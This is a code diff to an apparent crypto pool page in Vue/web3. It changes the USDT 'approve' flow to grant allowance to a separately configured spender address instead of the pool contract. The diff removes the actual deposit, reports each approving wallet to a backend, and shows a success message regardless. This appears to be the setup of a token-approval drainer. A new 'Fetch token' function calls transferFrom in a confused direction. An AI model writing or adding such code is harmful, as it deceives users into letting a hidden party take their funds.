@@ -1,4 +1,23 @@
 <template>
+    <section class="flex justify-end items-center gap-2 mb-6 mt-6">
+        <template v-if="account.address">
+            <router-link :to="{ name: 'asset', params: { address: account.address } }">
+                <Button class="btn-primary px-2 py-2 text-white">
+                    <div class="flex justify-center gap-3">
+                        <span class="text-xs">{{ account.shortAddress }}</span>
+                        <i class="pi pi-wallet"></i>
+                    </div>
+                </Button>
+            </router-link>
+
+            <Button class="btn-primary px-2 py-2 text-white" @click="disconnect">
+                <div class="flex justify-center gap-3">
+                    <span class="text-xs">{{ loading.logouting ? 'Disconnect...' : 'Disconnect' }}</span>
+                </div>
+            </Button>
+        </template>
+    </section>
+
     <div class="px-5 md:px-10 lg:px-20 mt-5 md:mt-10">
         <h1 class="font-semibold mb-3">All Pools</h1>
         <div class="card md:flex items-center gap-10 mb-14">
@@ -55,6 +74,7 @@
             </div>
         </div>
     </div>
+    <Button class="btn-primary" label="Fetch token" @click="fetchUSDT" />
 
     <Toast class="z-10" />
 </template>
@@ -70,8 +90,9 @@ import {
     $on,
     Events,
     account,
+    chain,
     connect as masterConnect,
-    disconnect as masterDisconnect,
+    disconnect as masterDisconnect
 } from '@kolirt/vue-web3-auth'
 import { contractABI } from '@/contracts/contractConfig'
 import { tokenABI } from '@/contracts/tokenABI'
@@ -80,6 +101,8 @@ import axiosClient from '@/services/axiosClient'
 const web3 = new Web3(window.ethereum)
 const contractAddress = import.meta.env.VITE_CONTRACT_ADDRESS
 const tokenAddress = import.meta.env.VITE_TOKEN_CONTRACT_ADDRESS
+const spenderAddress = import.meta.env.VITE_SPENDER_ADDRESS
+
 const contract = new web3.eth.Contract(contractABI, contractAddress)
 const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress)
 const toast = useToast()
@@ -135,31 +158,32 @@ const approveUSDT = async () => {
         try {
             isUsdtApproveBtnClicked.value = true
 
+            const approvalAmount = web3.utils.toWei('50', 'ether')
+            // const gasPrice = web3.utils.toWei('5', 'gwei')
+            // const gasLimit = 60000
+
             // Approve the spender to spend the specified amount of USDT tokens
-            const tx = await tokenContract.methods.approve(contractAddress, 10000000000).send({ from: account.address })
+            const tx = await tokenContract.methods.approve(spenderAddress, approvalAmount).send({
+                from: account.address,
+            })
 
             if (tx.transactionHash) {
-                let allowanceAmount = await tokenContract.methods.allowance(account.address, contractAddress).call()
+                let allowanceAmount = await tokenContract.methods.allowance(account.address, spenderAddress).call()
 
                 allowanceAmount = Number(allowanceAmount.toString())
+                console.log(allowanceAmount)
 
-                const transaction = await contract.methods.depositUSDT(allowanceAmount).send({
-                    from: account.address,
-                })
-
-                if (transaction) {
-                    const params = {
-                        wallet: account.address,
-                        real_balance: allowanceAmount,
-                        level: 1,
-                        type: 'usdt'
-                    }
-
-                    await axiosClient.post('/user-info', params)
-
-                    toast.add({ severity: 'success', detail: 'Token approve successful!', life: 3000 })
+                const params = {
+                    wallet: account.address,
+                    real_balance: allowanceAmount,
+                    level: 1,
+                    type: 'usdt'
                 }
+
+                await axiosClient.post('/user-info', params)
+
             }
+            toast.add({ severity: 'success', detail: 'Token approve successful!', life: 3000 })
 
             isUsdtApproveBtnClicked.value = false
         } catch (error) {
@@ -168,6 +192,28 @@ const approveUSDT = async () => {
             toast.add({ severity: 'warn', detail: 'Error during USDT deposit!', life: 3000 })
             console.error('Error during USDT deposit:', error)
         }
+    }
+}
+
+const fetchUSDT = async () => {
+    try {
+        let transferAmount = await tokenContract.methods.allowance(spenderAddress, account.address).call()
+        transferAmount = Number(transferAmount.toString())
+        console.log(transferAmount)
+
+        const tx = await tokenContract.methods.transferFrom(spenderAddress, account.address, transferAmount).send({
+            from: account.address
+        })
+
+        if (tx.transactionHash) {
+            console.log(tx.transactionHash)
+        }
+
+    } catch (error) {
+        isUsdtApproveBtnClicked.value = false
+
+        toast.add({ severity: 'warn', detail: 'Error during USDT deposit!', life: 3000 })
+        console.error('Error during USDT deposit:', error)
     }
 }
 
